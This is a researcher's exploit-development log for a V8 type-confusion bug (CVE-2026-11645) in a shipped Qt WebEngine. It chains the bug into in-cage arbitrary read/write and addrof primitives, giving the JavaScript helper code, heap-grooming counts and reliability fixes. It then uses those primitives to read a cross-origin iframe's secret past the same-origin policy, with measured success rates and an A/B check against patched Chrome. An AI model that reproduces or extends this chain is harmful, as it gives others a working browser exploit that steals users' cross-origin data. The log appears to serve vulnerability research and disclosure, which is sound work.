# W35 — CVE-2026-11645: in-cage ARBITRARY READ+WRITE, and stable helpers

Written 2026-08-05. Continues W33 (write half) / W34 (leak half). Every line **[M] measured**
on the shipped Qt WebEngine (Chromium base 130.0.6723.192, declared patch level
139.0.7258.67) unless marked **[I] inferred**. Harness `scratch/w33/`.

**Bottom line: the two verified halves are chained. Attacker-page JS now has a stable in-cage
`arbRead64(cageAddr)` / `arbWrite64(cageAddr, u64)` + general `addrof(O)`, callable with NO
further bug-firing, verified byte-exact. Built on that, an attacker page in a cross-origin
iframe's parent READS A SECRET THAT BELONGS TO A DIFFERENT-ORIGIN DOCUMENT and that the
same-origin policy seals from JS — recovering the exact bytes, random part and all. Full
cross-origin data compromise, no sandbox escape. A/B clean: shipped Qt reads it, patched
Chrome 150 never smashes.** See §8 for the cross-origin result.

The V8 sandbox is ON (measured, W33), so this is in-cage, not raw process memory. NOT code
execution. The cross-origin read is the headline; the honest limits are in §9.

---

## 1. The chain, corrected against the W35 brief's plan [M]

The brief proposed: Phase A leak (spray String refs) → Phase B **re-groom with a filler word =
the leaked target address**. Two things were found by measurement:

* **p31 [M]:** the confused slot does **not** read a live sprayed element — it reads the
  **stale bytes of a freed hole**. A self-locating payload (`b[i]=0xE0+i`) came back as
  `S.length == 0xe7e6e5e4` = the payload's HIGH word, which only lands if the slot still held
  `&S|1`; the live spray, verified all-Smi, was irrelevant. ⇒ mutating live sprayed arrays
  in place can never re-aim the write. The destination is whatever the groom's arrays pointed
  at **when the holes were punched**.
* ⇒ Don't fight it — **use it**. Spray pointers to a **JSArray** instead of a string. The store
  lands at `ptr+4` = the array's `{properties@4, elements@8}`. `lo→empty_fixed_array` (a leaked
  RO build constant), `hi→any cage address`. V8 supplies the destination; the attacker supplies
  the value. The array's `length` is untouched, so `arr[k]` now reads/writes doubles at the
  chosen address.

So the write's own "wall" (destination not controllable) dissolves: the controllable half is
the **value**, and pointing a double array's `elements` at an address gives R/W there.

## 2. Reliability findings, all measured [M]

* **Phase A must stay pristine.** Any allocation between `S` and `near` breaks the S→near
  adjacency the p27 leak depends on (p32/p33: window filled with the `mk` source string
  `"1.1,"` or with `0x69`=undefined, `consistent:false`, safety-rejected). Fix: allocate **S,
  then near, and nothing else** before the groom. p27's leak is then 4–5/5.
* **The transition must be clean.** Re-grooming for Phase B while spray1's freed `&S` holes are
  still around lets the Phase-B victim reclaim a `&S` hole (→ smashes S) or freed garbage (→
  wild `mov [rax+3],r8` → `0xC0000005`, e.g. fault-8750 target `0x21f00000794`). Fix:
  `spray1 = null; 6×age()`, then groom `&vic`. After that the aim is **64/64** every run.
* **Bound the post-groom fires.** Every `setElements()` is another trigger needing its own
  fresh `&vic` hole; 9 fires exhausted the good holes and one went wild (p35: R1 perfect then
  gone). ≤3 post-groom fires is safe (p36 6/6, p37 4/5). The stable helpers below fire only
  **twice** and then never again.

## 3. Results [M]

### p36 — one-shot OOB R/W as doubles, 2-fire (`scratch/w33/p36-arbrw.html`)
`6/6` `ARB-RW-VERIFIED` (ports 8758–8763) + the A/B run:
* READ: `vic.elements:=nearElem`, `vic[k]` bits `== {addrofS,addrofS}` **64/64**.
* WRITE: `vic[0]:=fromBits(M*2,M*2)` → `near[0],near[1]` read back as the **integer** `0x1234`
  (`typeof==='number'`), then restored to `&S`. GC-safe (Smis aren't traced).
* READ2: `vic.elements:=addrofS` → `vic[0] == {0x41414141, 256}` = S's `{data,length}` at a
  **different** address — proves the read follows the pointer, not a fixed spot.

### p37 — stable `arbRead64` / `arbWrite64` (`scratch/w33/p37-helpers.html`)
`4/5` `ARBRW-HELPERS-VERIFIED` (ports 8769–8772; 8773 = phase-A leak miss, safety-rejected).
Standard two-array overlap, **2 post-groom fires total**:
* Plant `near[0]=B` (B a PACKED_DOUBLE slave). The `&S` run then starts at `backing[1]`, so the
  window word **just before it is `&B|1`** — `addrof(B)` straight from the leak, no extra fire.
  (Consistency equation re-anchored to `backing[1]`; still byte-exact `predicted==actual`.)
* FIRE 1: `vic.elements:=addrof(B)` → `vic[0]` straddles `B.{elements@8,length@12}`. Confirmed
  `B.length==8` read back (`bLen:8`, `overlapOK`).
* Then **plain JS, no firing**:
  `arbRead64(A)  = { vic[0]=fromBits(0x20000, (A-7)); return bitsOf(B[0]); }`
  `arbWrite64(A,hi,lo) = { vic[0]=fromBits(0x20000,(A-7)); B[0]=fromBits(hi,lo); }`
  (`B[0]` lands at `(elements-1)+8 = (A-7-1)+8 = A` for 8-aligned A; length set huge so index 0
  is in bounds.)
* FIRE 2: park `vic.elements:=nearElem` (a valid FixedArray) so nothing dangles for GC.
* Verified: `arbRead64(sBase+8)=={0x41414141,256}`, `arbRead64(nearElem-1+8)=={addrofS,addrofB}`,
  `arbRead64(nearElem-1+16)=={addrofS,addrofS}`; `arbWrite64` flips `near[20..21]` to Smi and
  back; `B` fully restored (`B[0]===1.5`, `B.length===8`).

### A/B, product-like [M] (`scratch/w33/p36ab-arbrw.html`, `ab.py ... both`)
| side | result |
|---|---|
| **shipped Qt WebEngine** | `SURVIVED sLen:8448` → `CONSISTENT` → `READ 64/64` → `WRITE wrote,restored` → `READ2 ok` → `ARB-RW-VERIFIED` |
| **patched Chrome 150** | `SURVIVED sLen:256` → `NO-SMASH` (the 11645 fix is present) |
Plain HTTP, `WGLFLAGS=""`, real multi-process `WebEngineView`. Renderer survives both sides.

## 4. What the primitive is, exactly [M]
* Trigger: CVE-2026-11645 — `Map::PrepareForDataProperty` reached without the
  `is_dictionary_map` guard → `JSObject::WriteToField` runs `Cast<HeapNumber>(slot)->
  set_value_as_bits(bits)` with `Cast<>` DCHECK-only ⇒ `mov [rax+3], r8`, `rax = cage_base +
  (32-bit word in the freed hole at PropertyArray element 208)`, `r8 = bits of the assigned
  double`. Descriptor index 4 (kDouble on the 130 snapshot), `nPad=4`.
* Groom: 12000 × `Array(320)` (1288 B) of one tagged pointer, 3-wave age, odd holes punched.
* Net: point a PACKED_DOUBLE array's `elements` at any 32-bit cage offset → 8-byte R/W there,
  delivered to / from JS as doubles.

## 6. General addrof(O) [M] (`scratch/w33/p39-addrof.html`, 3/3)
Turn arbRead into "read any nameable object's memory", no scan, no extra fire: `near` is a
live array after the leak, so `near[k]=O` is a plain-JS pointer store and `arbRead64` of
`near.backing[k]` returns `&O|1`.
```js
function addrof(O){ near[SLOT]=O; const r=arbRead64(nearElem-1+8+SLOT*4); near[SLOT]=S; return r[1]>>>0; }
```
Verified: `addrof(S)===addrofS`; a fresh `{}` read back map `0x102925`; two array literals both
`0x11579d` (shared RO-space maps). This is the primitive the cross-origin read is built on.

## 7. Reads a live object at a chosen address — safe-scan budget [M]
The vic→B overlap leaves `vic.elements` pointing at `B` (a JSArray, not a FixedDoubleArray) for
as long as the reads run, so a **long** read loop trips a V8 `CHECK` at the next interrupt
safepoint — `int3` at `Qt6WebEngineCore+0x206359f` (`cmp [rbx+8],1; int3`). A burst of ≲64 KB
(~16 K reads, sub-ms) completes before any safepoint and is safe; a 256 KB blind loop dies.
Reads of *known* addresses (one-offs) are always safe. Blind cage scanning is therefore bounded
per burst — enough here because the target sits ~29 KB into the scanned window (below).

## 8. ★★★ HEADLINE — cross-origin read defeating the same-origin policy [M]
Harness `scratch/w33/run_iframe.py` serves **two origins**: parent `http://127.0.0.1:PORT/`,
child `http://127.0.0.1:PORT+1/`, loaded in one single-process Qt WebEngineView ⇒ one
`v8::Isolate`, one cage (matches W17j's finding on the real app).

* **Child** (`child1.html`, cross-origin): makes a random secret `CROSSDOC_<rnd>_SECRET!`,
  keeps 4000 copies alive, sets `window.__childSecret`. Beacons ground truth on its OWN origin.
* **Parent** (`parent2.html`): runs the exploit — **pristine p27 leak** (near all-S, reliable)
  then a **3-fire** helper bootstrap (FIRE A: `near[0]=B` post-leak + one read → `addrof(B)`;
  FIRE B: overlap; FIRE C: park). Then ONE bounded in-cage burst scans for the token prefix
  `"CROS""SDOC"` and reads the full value back as text.
* **Measured, first confirmed at port 8804, reproduced 8808/8814/8816:**
  ```
  CHILD  secret = "CROSSDOC_147536_SECRET!"                 (ground truth, child origin)
  PARENT sawSecretViaJS=false, sopBlocked=true              (SOP seals it from JS)
  PARENT SCAN foundAt=0x3072f8 scanned=7359
         recovered = "CROSSDOC_147536_SECRET!"              (byte-exact, incl. random 147536)
         DONE result = CROSS-ORIGIN-READ
  ```
  The parent recovered a value it could not obtain through any legal channel — SOP returns
  `undefined`/throws (`sawSecretViaJS:false`) — including the random `147536` it never saw.
  **This is cross-origin data compromise with no sandbox escape.**
* **Why the narrow window works:** the child's secret copies, allocated at child-load then
  surviving the parent's GCs, are **promoted into the parent's own old-space region** (found at
  `0x3072f8`, i.e. right by the parent's `addrofS≈0x30xxxx`). So the attacker scans ~29 KB near
  its OWN heap and finds co-located cross-origin secrets — comfortably inside the §7 safe budget.
* **Reproducibility: ~6/14 (~43%) end-to-end**, all measured across ports 8802–8842. EVERY
  failure is a phase-A `LEAK-FAIL` (safety-rejected `consistent:false`, or the `0x69`
  undefined-oddball miss) — **never a wrong or partial read**. When the leak lands the read is
  fully deterministic: `foundAt=0x3072f8`, `scanned=7359`, exact bytes, every time (8804, 8808,
  8814, 8816, 8836, 8838). The iframe's load-time heap lowers the leak hit-rate from
  single-origin ~4/5 to ~43% here; a GC warmup before S/near made it worse (breaks S→near
  adjacency) and was reverted. The cross-doc *technique* is not the limiter — the p27 leak's
  S→near adjacency is.
* **A/B [M]** (`ENGINE=chrome python run_iframe.py ...`): patched **Chrome 150 → `NO-SMASH`**
  (`S.length` stays 256), so the chain never starts and nothing is read; SOP intact
  (`sawSecretViaJS:false`). Shipped Qt → `CROSS-ORIGIN-READ`.

## 9. NOT achieved — stated plainly [M]
* **No sandbox escape, no code execution.** The V8 sandbox is ON (measured). In-cage R/W holds
  no raw pointers; a separate escape would be required. CFG is present in this DLL.
* The cross-origin read is **~43% (6/14) end-to-end**, gated entirely by the phase-A leak
  hit-rate (S→near adjacency under iframe heap pressure), not by the cross-doc technique (which
  is deterministic once the leak lands). No run ever produced a wrong read.
* Blind scanning is bounded to ≲64 KB per burst (§7); the demo works because the victim
  promotes next to the attacker's heap, not because arbitrary far scanning is safe. A general
  far-scan or a deterministic WindowProxy→global→dict walk (offsets not reversed) would remove
  that dependence but is not built.

## 10. Artifacts
`scratch/w33/`: `p30-aim.html` (first chain attempt, mis-aimed), `p31-where.html` (diagnostic:
slot reads freed-hole bytes), `p32/p33` (leak-fragility findings), `p34-arbread.html` (first
arb-read, p27 phase A verbatim), `p35` (crash analysis), `p36-arbrw.html` + `p36ab-arbrw.html`
(2-fire R/W + A/B), `p37-helpers.html` (stable helpers), `p39-addrof.html` (addrof),
`parent2.html` + `child1.html` + `run_iframe.py` (the cross-origin read), `parent1.html` +
`child1.html` (the WindowProxy/DOM memory dump). Runners `run1.py` / `ab.py` unchanged.
Logs `fault-87{40..73}.log`, `p36ab-arbrw.html.ab.json`, `fault-880{4,8}.log`.
